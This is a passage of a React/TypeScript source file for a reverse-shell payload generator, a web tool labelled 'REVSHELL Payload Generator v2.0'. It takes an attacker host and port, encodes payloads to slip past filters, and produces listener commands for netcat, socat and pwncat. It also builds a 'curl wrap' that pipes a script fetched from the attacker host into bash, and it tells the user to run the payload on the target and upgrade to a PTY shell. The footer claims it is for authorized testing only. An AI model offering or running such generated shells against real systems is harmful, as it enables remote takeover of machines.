    if (parseInt(n) >= 1 && parseInt(n) <= 65535)
      return `<span style="color:#ff9f43;font-weight:bold">${n}</span>`;
    return m;
  });
}

function hexToRgb(hex: string): string {
  const clean = hex.replace("#", "");
  const r = parseInt(clean.substring(0, 2), 16);
  const g = parseInt(clean.substring(2, 4), 16);
  const b = parseInt(clean.substring(4, 6), 16);
  return `${r},${g},${b}`;
}

// ─── Category Icons ───────────────────────────────────────────────────────────
const CATEGORY_ICONS: Record<string, string> = {
  Bash: "bash",
  Python: "py",
  PHP: "php",
  Netcat: "nc",
  PowerShell: "PS>",
  Ruby: "rb",
  Perl: "pl",
  Java: "jv",
  Go: "go",
  "Node.js": "js",
  Socat: "sc",
  Awk: "awk",
  Lua: "lua",
  OpenSSL: "ssl",
  Telnet: "tel",
  Download: "dl",
  JVM: "jvm",
  R: "R",
  Zsh: "zsh",
  Kotlin: "kt",
  Scala: "sc",
  Crystal: "cr",
  Dart: "dt",
  V: "v",
  Windows: "cmd",
  Haskell: "hs",
  Tcl: "tcl",
};

export default function RevShellGen(): React.ReactElement {
  const [ip, setIp] = useState<string>("10.10.10.10");
  const [port, setPort] = useState<string>("4444");
  const [selectedShell, setSelectedShell] = useState<Shell>(SHELLS[0]);
  const [encoding, setEncoding] = useState<EncodingKey>("none");
  const [theme, setTheme] = useState<ThemeKey>("green");
  const [copied, setCopied] = useState<boolean>(false);
  const [copiedListener, setCopiedListener] = useState<boolean>(false);
  const [showExplain, setShowExplain] = useState<boolean>(false);
  const [listenerType, setListenerType] = useState<ListenerType>("nc");
  const [search, setSearch] = useState<string>("");
  const [favorites, setFavorites] = useState<Set<string>>(
    new Set(["bash-tcp", "python3", "nc-openbsd"]),
  );
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const [showHistory, setShowHistory] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<TabKey>("payload");
  const [autoIpLoading, setAutoIpLoading] = useState<boolean>(false);
  const [prevPayload, setPrevPayload] = useState<string>("");
  const [showDiff, setShowDiff] = useState<boolean>(false);
  const t: Theme = THEMES[theme];

  const payload: string = selectedShell.generate(ip || "IP", port || "PORT");
  const encodedPayload: string = encodePayload(payload, encoding);
  const listenerCmd: string = getListener(port || "PORT", listenerType);

  // Derive validation errors with useMemo instead of useEffect+setState
  const ipError: string = useMemo(() => {
    if (!ip) return "";
    const v4 = /^(\d{1,3}\.){3}\d{1,3}$/;
    const v6 = /^[0-9a-fA-F:]+$/;
    const hostname = /^[a-zA-Z0-9.-]+$/;
    if (!v4.test(ip) && !v6.test(ip) && !hostname.test(ip))
      return "Invalid IP/hostname";
    return "";
  }, [ip]);

  const portError: string = useMemo(() => {
    if (!port) return "";
    const n = parseInt(port, 10);
    if (isNaN(n) || n < 1 || n > 65535) return "Port: 1\u201365535";
    return "";
  }, [port]);

  // Push to history when payload changes
  useEffect(() => {
    if (ip && port && !ipError && !portError) {
      const entry: HistoryEntry = {
        payload: encodedPayload,
        shell: selectedShell.label,
        ts: Date.now(),
      };
      setHistory((h) => {
        const filtered = h.filter((x) => x.payload !== entry.payload);
        return [entry, ...filtered].slice(0, 10);
      });
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [encodedPayload]);

  const copyPayload = useCallback(() => {
    navigator.clipboard.writeText(encodedPayload).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  }, [encodedPayload]);

  const copyListener = useCallback(() => {
    navigator.clipboard.writeText(listenerCmd).then(() => {
      setCopiedListener(true);
      setTimeout(() => setCopiedListener(false), 1500);
    });
  }, [listenerCmd]);

  const fetchPublicIp = async (): Promise<void> => {
    setAutoIpLoading(true);
    try {
      const r = await fetch("https://api.ipify.org?format=json");
      const d = (await r.json()) as { ip: string };
      setIp(d.ip);
    } catch {
      setIp("Could not fetch");
    }
    setAutoIpLoading(false);
  };

  const toggleFavorite = (id: string): void => {
    setFavorites((f) => {
      const n = new Set(f);
      n.has(id) ? n.delete(id) : n.add(id);
      return n;
    });
  };

  const downloadPayload = (): void => {
    const blob = new Blob([encodedPayload], { type: "text/plain" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `revshell.${selectedShell.ext}`;
    a.click();
  };

  const categories: string[] = [
    ...new Set(SHELLS.map((s: Shell) => s.category)),
  ];
  const filteredShells: Shell[] = SHELLS.filter(
    (s: Shell) =>
      s.label.toLowerCase().includes(search.toLowerCase()) ||
      s.category.toLowerCase().includes(search.toLowerCase()),
  );

  const shareUrl = (): void => {
    const params = new URLSearchParams({
      ip,
      port,
      shell: selectedShell.id,
      enc: encoding,
    });
    navigator.clipboard.writeText(
      `${window.location.origin}${window.location.pathname}?${params}`,
    );
  };

  // Load from URL params on mount
  useEffect(() => {
    const p = new URLSearchParams(window.location.search);
    if (p.get("ip")) setIp(p.get("ip") as string);
    if (p.get("port")) setPort(p.get("port") as string);
    if (p.get("shell")) {
      const s = SHELLS.find((x) => x.id === p.get("shell"));
      if (s) setSelectedShell(s);
    }
    if (p.get("enc")) setEncoding(p.get("enc") as EncodingKey);
  }, []);

  const css = `
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap');
    * { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --accent: ${t.accent};
      --dim: ${t.dim};
      --bg: ${t.bg};
      --panel: ${t.panel};
      --border: ${t.border};
      --text: ${t.text};
      --muted: ${t.muted};
    }
    body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; }
    ::-webkit-scrollbar { width: 4px; height: 4px; }
    ::-webkit-scrollbar-track { background: var(--bg); }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

    @keyframes scanline {
      0% { transform: translateY(-100%); }
      100% { transform: translateY(100vh); }
    }
    @keyframes flicker {
      0%,100% { opacity:1; } 92% { opacity:1; } 93% { opacity:0.8; } 94% { opacity:1; } 96% { opacity:0.9; }
    }
    @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }
    @keyframes fadeIn { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:translateY(0); } }
    @keyframes pulse { 0%,100% { box-shadow: 0 0 5px var(--accent); } 50% { box-shadow: 0 0 20px var(--accent); } }

    .scanline {
      position:fixed; top:0; left:0; right:0; height:2px;
      background: linear-gradient(transparent, rgba(${hexToRgb(t.accent)},0.08), transparent);
      animation: scanline 8s linear infinite;
      pointer-events:none; z-index:9999;
    }
    .crt-overlay {
      position:fixed; inset:0; pointer-events:none; z-index:9998;
      background: repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 2px);
      animation: flicker 6s infinite;
    }
    .app { display:flex; flex-direction:column; min-height:100vh; animation: fadeIn 0.4s ease; }
    .header {
      border-bottom: 1px solid var(--border);
      padding: 12px 24px;
      display:flex; align-items:center; justify-content:space-between;
      background: var(--panel);
      position:sticky; top:0; z-index:100;
    }
    .logo { display:flex; align-items:center; gap:12px; }
    .logo-icon {
      width:36px; height:36px; border:1px solid var(--accent);
      display:flex; align-items:center; justify-content:center;
      font-size:10px; color:var(--accent); font-weight:700;
      box-shadow: 0 0 10px var(--dim), inset 0 0 10px rgba(0,0,0,0.5);
      animation: pulse 3s ease-in-out infinite;
    }
    .logo-text { font-family:'Share Tech Mono',monospace; font-size:18px; color:var(--accent); letter-spacing:3px; text-shadow: 0 0 15px var(--dim); }
    .logo-sub { font-size:10px; color:var(--muted); letter-spacing:2px; margin-top:2px; }
    .theme-btns { display:flex; gap:6px; }
    .theme-btn {
      width:18px; height:18px; border-radius:50%; cursor:pointer; border:2px solid transparent;
      transition:all 0.2s;
    }
    .theme-btn.active { border-color: #ffffff88; transform:scale(1.2); }
    .main { display:flex; flex:1; gap:0; }
    .sidebar {
      width:220px; min-width:220px; border-right:1px solid var(--border);
      background:var(--panel); display:flex; flex-direction:column;
      height:calc(100vh - 57px); position:sticky; top:57px; overflow:hidden;
    }
    .sidebar-search {
      padding:10px; border-bottom:1px solid var(--border);
    }
    .search-input {
      width:100%; background:var(--bg); border:1px solid var(--border);
      color:var(--text); padding:6px 10px; font-family:'JetBrains Mono',monospace;
      font-size:11px; outline:none; transition:border 0.2s;
    }
    .search-input:focus { border-color:var(--accent); }
    .shell-list { overflow-y:auto; flex:1; }
    .shell-category { padding:8px 10px 4px; font-size:9px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .shell-item {
      display:flex; align-items:center; gap:8px; padding:7px 10px;
      cursor:pointer; transition:all 0.15s; border-left:2px solid transparent;
      font-size:11px;
    }
    .shell-item:hover { background:rgba(255,255,255,0.03); border-left-color:var(--dim); }
    .shell-item.active { background:rgba(255,255,255,0.06); border-left-color:var(--accent); color:var(--accent); }
    .shell-icon {
      width:28px; height:20px; background:var(--bg); border:1px solid var(--border);
      display:flex; align-items:center; justify-content:center; font-size:8px;
      color:var(--muted); flex-shrink:0; font-weight:700;
    }
    .shell-item.active .shell-icon { border-color:var(--accent); color:var(--accent); }
    .star-btn { margin-left:auto; background:none; border:none; cursor:pointer; color:var(--muted); font-size:12px; padding:0 2px; }
    .star-btn.active { color:#ffd700; }
    .content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
    .config-bar {
      padding:14px 20px; border-bottom:1px solid var(--border);
      background:var(--panel); display:flex; flex-wrap:wrap; gap:12px; align-items:flex-end;
    }
    .field { display:flex; flex-direction:column; gap:4px; }
    .field-label { font-size:9px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .field-input {
      background:var(--bg); border:1px solid var(--border);
      color:var(--text); padding:7px 10px; font-family:'JetBrains Mono',monospace;
      font-size:13px; outline:none; transition:all 0.2s; width:180px;
    }
    .field-input:focus { border-color:var(--accent); box-shadow:0 0 8px var(--dim); }
    .field-input.error { border-color:#ff4444; }
    .error-msg { font-size:9px; color:#ff4444; margin-top:2px; }
    .port-quick { display:flex; gap:4px; flex-wrap:wrap; margin-top:4px; }
    .port-chip {
      padding:2px 6px; background:var(--bg); border:1px solid var(--border);
      font-size:10px; cursor:pointer; color:var(--muted); transition:all 0.15s;
      font-family:'JetBrains Mono',monospace;
    }
    .port-chip:hover, .port-chip.active { border-color:var(--accent); color:var(--accent); }
    .select-field {
      background:var(--bg); border:1px solid var(--border); color:var(--text);
      padding:7px 10px; font-family:'JetBrains Mono',monospace; font-size:12px;
      outline:none; cursor:pointer; min-width:140px;
    }
    .select-field:focus { border-color:var(--accent); }
    .ip-row { display:flex; gap:6px; align-items:flex-end; }
    .auto-btn {
      padding:7px 10px; background:var(--bg); border:1px solid var(--border);
      color:var(--muted); font-size:10px; cursor:pointer; transition:all 0.2s;
      font-family:'JetBrains Mono',monospace; white-space:nowrap;
    }
    .auto-btn:hover { border-color:var(--accent); color:var(--accent); }
    .tabs { display:flex; border-bottom:1px solid var(--border); background:var(--panel); }
    .tab {
      padding:10px 18px; font-size:11px; cursor:pointer; color:var(--muted);
      border-bottom:2px solid transparent; transition:all 0.2s; letter-spacing:1px;
    }
    .tab:hover { color:var(--text); }
    .tab.active { color:var(--accent); border-bottom-color:var(--accent); }
    .output-area { flex:1; padding:20px; overflow:auto; display:flex; flex-direction:column; gap:16px; }
    .output-card {
      background:var(--panel); border:1px solid var(--border);
      animation: fadeIn 0.2s ease;
    }
    .card-header {
      display:flex; align-items:center; justify-content:space-between;
      padding:8px 14px; border-bottom:1px solid var(--border); background:rgba(0,0,0,0.2);
    }
    .card-title { font-size:10px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .card-actions { display:flex; gap:6px; }
    .action-btn {
      padding:4px 10px; font-size:10px; background:var(--bg); border:1px solid var(--border);
      color:var(--muted); cursor:pointer; transition:all 0.2s; font-family:'JetBrains Mono',monospace;
    }
    .action-btn:hover { border-color:var(--accent); color:var(--accent); }
    .action-btn.success { border-color:#00ff41; color:#00ff41; }
    .action-btn.primary { border-color:var(--accent); color:var(--accent); }
    .payload-box {
      padding:16px; font-size:12px; line-height:1.8; word-break:break-all;
      position:relative; min-height:60px;
    }
    .cursor { display:inline-block; width:8px; height:14px; background:var(--accent); margin-left:2px; animation:blink 1s step-end infinite; vertical-align:text-bottom; }
    .explain-section { padding:12px 16px; border-top:1px solid var(--border); background:rgba(0,0,0,0.2); }
    .explain-row { display:flex; gap:12px; margin-bottom:6px; font-size:11px; }
    .explain-key { color:var(--accent); min-width:180px; flex-shrink:0; }
    .explain-val { color:var(--muted); }
    .listener-select { padding:4px 8px; background:var(--bg); border:1px solid var(--border); color:var(--text); font-family:'JetBrains Mono',monospace; font-size:11px; outline:none; cursor:pointer; }
    .history-list { padding:12px; display:flex; flex-direction:column; gap:6px; }
    .history-item {
      padding:8px 12px; background:var(--bg); border:1px solid var(--border);
      cursor:pointer; transition:all 0.15s; font-size:11px;
    }
    .history-item:hover { border-color:var(--accent); }
    .history-meta { display:flex; gap:12px; color:var(--muted); font-size:9px; margin-top:4px; }
    .history-payload { color:var(--text); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .diff-view { padding:12px 16px; font-size:11px; line-height:1.8; }
    .diff-add { color:#00ff41; background:rgba(0,255,65,0.05); }
    .diff-remove { color:#ff4444; background:rgba(255,68,68,0.05); text-decoration:line-through; }
    .encoding-row { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
    .enc-chip {
      padding:4px 10px; background:var(--bg); border:1px solid var(--border);
      font-size:10px; cursor:pointer; color:var(--muted); transition:all 0.15s;
      font-family:'JetBrains Mono',monospace;
    }
    .enc-chip:hover { border-color:var(--dim); color:var(--text); }
    .enc-chip.active { border-color:var(--accent); color:var(--accent); background:rgba(255,255,255,0.03); }
    .length-badge { font-size:9px; color:var(--muted); padding:2px 6px; background:var(--bg); border:1px solid var(--border); }
    .footer { padding:10px 24px; border-top:1px solid var(--border); background:var(--panel); display:flex; justify-content:space-between; align-items:center; }
    .footer-text { font-size:9px; color:var(--muted); letter-spacing:1px; }
    .status-dot { width:6px; height:6px; border-radius:50%; background:var(--accent); display:inline-block; box-shadow:0 0 6px var(--accent); animation:pulse 2s infinite; margin-right:6px; }
    .favorites-section { padding:6px 0; border-bottom:1px solid var(--border); }
    .fav-label { padding:4px 10px 2px; font-size:9px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }
    .empty-state { padding:20px; text-align:center; color:var(--muted); font-size:11px; }
    .kbd { display:inline-block; padding:1px 5px; background:var(--bg); border:1px solid var(--border); font-size:9px; color:var(--muted); }
  `;

  // Keyboard shortcuts
  useEffect(() => {
    const handler = (e: KeyboardEvent): void => {
      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
        e.preventDefault();
        copyPayload();
      }
      if ((e.ctrlKey || e.metaKey) && e.key === "k") {
        e.preventDefault();
        setSearch("");
      }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [copyPayload]);

  const favShells: Shell[] = SHELLS.filter((s: Shell) => favorites.has(s.id));

  const encodingOptions: [EncodingKey, string][] = [
    ["none", "raw"],
    ["base64", "b64"],
    ["url", "url"],
    ["double-url", "2url"],
    ["hex", "hex"],
  ];

  return (
    <div className="app" style={{ fontFamily: "'JetBrains Mono', monospace" }}>
      <style>{css}</style>
      <div className="scanline" />
      <div className="crt-overlay" />

      {/* Header */}
      <header className="header">
        <div className="logo">
          <div className="logo-icon">&gt;_</div>
          <div>
            <div className="logo-text">REVSHELL</div>
            <div className="logo-sub">PAYLOAD GENERATOR v2.0</div>
          </div>
        </div>
        <div style={{ display: "flex", gap: "16px", alignItems: "center" }}>
          <span style={{ fontSize: "10px", color: t.muted }}>
            <span className="kbd">Ctrl+Enter</span> copy &nbsp;{" "}
            <span className="kbd">Ctrl+K</span> search
          </span>
          <div className="theme-btns">
            {(Object.entries(THEMES) as [ThemeKey, Theme][]).map(([k, v]) => (
              <div
                key={k}
                className={`theme-btn ${theme === k ? "active" : ""}`}
                style={{ background: v.accent }}
                onClick={() => setTheme(k as ThemeKey)}
                title={v.name}
              />
            ))}
          </div>
        </div>
      </header>

      <div className="main">
        {/* Sidebar */}
        <aside className="sidebar">
          <div className="sidebar-search">
            <input
              className="search-input"
              placeholder="/ search shells..."
              value={search}
              onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                setSearch(e.target.value)
              }
              spellCheck={false}
            />
          </div>

          {/* Favorites */}
          {favShells.length > 0 && !search && (
            <div className="favorites-section">
              <div className="fav-label">★ Favorites</div>
              {favShells.map((s) => (
                <div
                  key={s.id}
                  className={`shell-item ${selectedShell.id === s.id ? "active" : ""}`}
                  onClick={() => {
                    setPrevPayload(payload);
                    setSelectedShell(s);
                  }}
                >
                  <div className="shell-icon">
                    {CATEGORY_ICONS[s.category] ?? s.category.slice(0, 3)}
                  </div>
                  <span>{s.label}</span>
                  <button
                    className="star-btn active"
                    onClick={(e: React.MouseEvent) => {
                      e.stopPropagation();
                      toggleFavorite(s.id);
                    }}
                  >
                    ★
                  </button>
                </div>
              ))}
            </div>
          )}

          <div className="shell-list">
            {categories.map((cat) => {
              const shells = filteredShells.filter((s) => s.category === cat);
              if (!shells.length) return null;
              return (
                <div key={cat}>
                  <div className="shell-category">{cat}</div>
                  {shells.map((s) => (
                    <div
                      key={s.id}
                      className={`shell-item ${selectedShell.id === s.id ? "active" : ""}`}
                      onClick={() => {
                        setPrevPayload(payload);
                        setSelectedShell(s);
                      }}
                    >
                      <div className="shell-icon">
                        {CATEGORY_ICONS[s.category] ?? s.category.slice(0, 3)}
                      </div>
                      <span>{s.label}</span>
                      <button
                        className={`star-btn ${favorites.has(s.id) ? "active" : ""}`}
                        onClick={(e: React.MouseEvent) => {
                          e.stopPropagation();
                          toggleFavorite(s.id);
                        }}
                      >
                        {favorites.has(s.id) ? "★" : "☆"}
                      </button>
                    </div>
                  ))}
                </div>
              );
            })}
            {filteredShells.length === 0 && (
              <div className="empty-state">no shells found</div>
            )}
          </div>
        </aside>

        {/* Main Content */}
        <div className="content">
          {/* Config Bar */}
          <div className="config-bar">
            <div className="field">
              <div className="field-label">LHOST</div>
              <div className="ip-row">
                <input
                  className={`field-input ${ipError ? "error" : ""}`}
                  value={ip}
                  onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                    setIp(e.target.value)
                  }
                  placeholder="10.10.10.10"
                  spellCheck={false}
                />
                <button
                  className="auto-btn"
                  onClick={fetchPublicIp}
                  disabled={autoIpLoading}
                >
                  {autoIpLoading ? "..." : "auto"}
                </button>
              </div>
              {ipError && <div className="error-msg">{ipError}</div>}
            </div>

            <div className="field">
              <div className="field-label">LPORT</div>
              <input
                className={`field-input ${portError ? "error" : ""}`}
                value={port}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  setPort(e.target.value)
                }
                placeholder="4444"
                style={{ width: "100px" }}
              />
              <div className="port-quick">
                {COMMON_PORTS.map((p) => (
                  <div
                    key={p}
                    className={`port-chip ${port === String(p) ? "active" : ""}`}
                    onClick={() => setPort(String(p))}
                  >
                    {p}
                  </div>
                ))}
              </div>
              {portError && <div className="error-msg">{portError}</div>}
            </div>

            <div className="field">
              <div className="field-label">ENCODING</div>
              <div className="encoding-row">
                {encodingOptions.map(([val, lbl]) => (
                  <div
                    key={val}
                    className={`enc-chip ${encoding === val ? "active" : ""}`}
                    onClick={() => setEncoding(val)}
                  >
                    {lbl}
                  </div>
                ))}
              </div>
            </div>

            <div className="field">
              <div className="field-label">OPTIONS</div>
              <div style={{ display: "flex", gap: "6px", marginTop: "4px" }}>
                <div
                  className={`enc-chip ${showExplain ? "active" : ""}`}
                  onClick={() => setShowExplain((v) => !v)}
                >
                  explain
                </div>
                <div
                  className={`enc-chip ${showHistory ? "active" : ""}`}
                  onClick={() => setShowHistory((v) => !v)}
                >
                  history
                </div>
                {prevPayload && (
                  <div
                    className={`enc-chip ${showDiff ? "active" : ""}`}
                    onClick={() => setShowDiff((v) => !v)}
                  >
                    diff
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Tabs */}
          <div className="tabs">
            <div
              className={`tab ${activeTab === "payload" ? "active" : ""}`}
              onClick={() => setActiveTab("payload")}
            >
              PAYLOAD
            </div>
            <div
              className={`tab ${activeTab === "listener" ? "active" : ""}`}
              onClick={() => setActiveTab("listener")}
            >
              LISTENER
            </div>
            {showHistory && (
              <div
                className={`tab ${activeTab === "history" ? "active" : ""}`}
                onClick={() => setActiveTab("history")}
              >
                HISTORY
              </div>
            )}
          </div>

          <div className="output-area">
            {activeTab === "payload" && (
              <>
                <div className="output-card">
                  <div className="card-header">
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "10px",
                      }}
                    >
                      <span className="card-title">{selectedShell.label}</span>
                      <span className="length-badge">
                        {encodedPayload.length} chars
                      </span>
                      {encoding !== "none" && (
                        <span
                          className="length-badge"
                          style={{ color: t.accent }}
                        >
                          encoded: {encoding}
                        </span>
                      )}
                    </div>
                    <div className="card-actions">
                      <button
                        className="action-btn"
                        onClick={shareUrl}
                        title="Copy shareable URL"
                      >
                        share
                      </button>
                      <button className="action-btn" onClick={downloadPayload}>
                        download .{selectedShell.ext}
                      </button>
                      <button
                        className={`action-btn ${copied ? "success" : "primary"}`}
                        onClick={copyPayload}
                      >
                        {copied ? "✓ copied!" : "copy"}
                      </button>
                    </div>
                  </div>
                  <div className="payload-box">
                    <span
                      dangerouslySetInnerHTML={{
                        __html: highlightPayload(encodedPayload, t.accent),
                      }}
                    />
                    <span className="cursor" />
                  </div>
                  {showExplain &&
                    Object.keys(selectedShell.explain || {}).length > 0 && (
                      <div className="explain-section">
                        {Object.entries(selectedShell.explain).map(([k, v]) => (
                          <div key={k} className="explain-row">
                            <span className="explain-key">{k}</span>
                            <span className="explain-val">
                              {"// "}
                              {v}
                            </span>
                          </div>
                        ))}
                      </div>
                    )}
                  {showDiff && prevPayload && (
                    <div className="diff-view">
                      <div
                        style={{
                          fontSize: "9px",
                          color: t.muted,
                          marginBottom: "8px",
                          letterSpacing: "2px",
                        }}
                      >
                        ─── DIFF (prev → current) ───
                      </div>
                      <div className="diff-remove">{prevPayload}</div>
                      <div
                        style={{
                          color: t.muted,
                          fontSize: "10px",
                          margin: "4px 0",
                        }}
                      >
                        ↓
                      </div>
                      <div className="diff-add">{encodedPayload}</div>
                    </div>
                  )}
                </div>

                {/* Curl wrap */}
                <div className="output-card">
                  <div className="card-header">
                    <span className="card-title">CURL WRAP</span>
                    <button
                      className="action-btn"
                      onClick={() =>
                        navigator.clipboard.writeText(
                          `curl -s http://${ip}:${port}/ | ${selectedShell.ext === "sh" ? "bash" : selectedShell.ext}`,
                        )
                      }
                    >
                      copy
                    </button>
                  </div>
                  <div
                    className="payload-box"
                    style={{ fontSize: "11px", color: t.muted }}
                  >
                    <span style={{ color: t.accent }}>curl</span> -s http://{ip}
                    :{port}/ |{" "}
                    {selectedShell.ext === "sh" ? "bash" : selectedShell.ext}
                  </div>
                </div>
              </>
            )}

            {activeTab === "listener" && (
              <div className="output-card">
                <div className="card-header">
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "10px",
                    }}
                  >
                    <span className="card-title">LISTENER COMMAND</span>
                    <select
                      className="listener-select"
                      value={listenerType}
                      onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                        setListenerType(e.target.value as ListenerType)
                      }
                    >
                      <option value="nc">netcat</option>
                      <option value="ncat">ncat</option>
                      <option value="socat">socat basic</option>
                      <option value="socat-pty">socat PTY</option>
                      <option value="socat-tls">socat TLS</option>
                      <option value="pwncat">pwncat-cs</option>
                    </select>
                  </div>
                  <button
                    className={`action-btn ${copiedListener ? "success" : "primary"}`}
                    onClick={copyListener}
                  >
                    {copiedListener ? "✓ copied!" : "copy"}
                  </button>
                </div>
                <div className="payload-box" style={{ whiteSpace: "pre-wrap" }}>
                  <span
                    dangerouslySetInnerHTML={{
                      __html: highlightPayload(listenerCmd, t.accent),
                    }}
                  />
                  <span className="cursor" />
                </div>
                <div className="explain-section">
                  <div style={{ fontSize: "10px", color: t.muted }}>
                    Run this on your machine before executing the payload on the
                    target. For PTY upgrade after getting shell:{" "}
                    <span style={{ color: t.accent }}>
                      python3 -c &apos;import
                      pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
                    </span>
                  </div>
                </div>
              </div>
            )}

            {activeTab === "history" && showHistory && (
              <div className="output-card">
                <div className="card-header">
                  <span className="card-title">PAYLOAD HISTORY</span>
                  <button className="action-btn" onClick={() => setHistory([])}>
                    clear
                  </button>
                </div>
                <div className="history-list">
                  {history.length === 0 && (
                    <div className="empty-state">no history yet</div>
                  )}
                  {history.map((h: HistoryEntry, i: number) => (
                    <div
                      key={i}
                      className="history-item"
                      onClick={() => navigator.clipboard.writeText(h.payload)}
                    >
                      <div className="history-payload">{h.payload}</div>
                      <div className="history-meta">
                        <span>{h.shell}</span>
                        <span>{new Date(h.ts).toLocaleTimeString()}</span>
                        <span>{h.payload.length} chars</span>
                        <span style={{ color: t.accent }}>click to copy</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      <footer className="footer">
        <div className="footer-text">
          <span className="status-dot" />
          {SHELLS.length} shells · {Object.keys(THEMES).length} themes · for
          authorized testing only
        </div>
        <div className="footer-text">REVSHELL GEN · educational use only</div>
      </footer>
    </div>
  );
}
